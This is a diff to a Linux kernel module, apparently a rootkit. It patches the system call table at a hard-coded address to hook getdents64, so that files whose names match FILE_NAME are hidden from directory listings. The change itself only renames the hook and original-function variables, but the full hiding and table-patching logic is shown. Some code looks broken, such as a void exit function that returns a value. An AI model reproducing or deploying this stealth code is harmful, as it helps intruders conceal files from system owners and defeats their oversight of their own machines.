@@ -11,14 +11,13 @@
 
 void **sys_call_table;
 
-asmlinkage int (*original_getdents64) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
+asmlinkage int (*getdents64_original) (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count);
 
-asmlinkage int sys_getdents64_hook(unsigned int fd, struct linux_dirent64 *dirp, unsigned int count)
-{
+asmlinkage int getdents64_hook        (unsigned int fd, struct linux_dirent64 *dirp, unsigned int count) {
   int rtn;
   struct linux_dirent64 *cur = dirp;
   int i = 0;
-  rtn = original_getdents64(fd, dirp, count);
+  rtn = getdents64_original(fd, dirp, count);
 
   while (i < rtn) {
     if (strncmp(cur->d_name, FILE_NAME, strlen(FILE_NAME)) == 0) {
@@ -51,16 +50,16 @@ int set_page_ro(unsigned long addr) {
 
 int f_init(void) {
   sys_call_table = (void*)0xc1454100;
-  original_getdents64 = sys_call_table[__NR_getdents64];
+  getdents64_original = sys_call_table[__NR_getdents64];
 
   set_page_rw(sys_call_table);
-  sys_call_table[__NR_getdents64] = sys_getdents64_hook;
+  sys_call_table[__NR_getdents64] = getdents64_hook;
 
   return 0;
 }
 
 void f_exit(void) {
-  sys_call_table[__NR_getdents64] = original_getdents64;
+  sys_call_table[__NR_getdents64] = getdents64_original;
   set_page_ro(sys_call_table);
   return 0;
 }
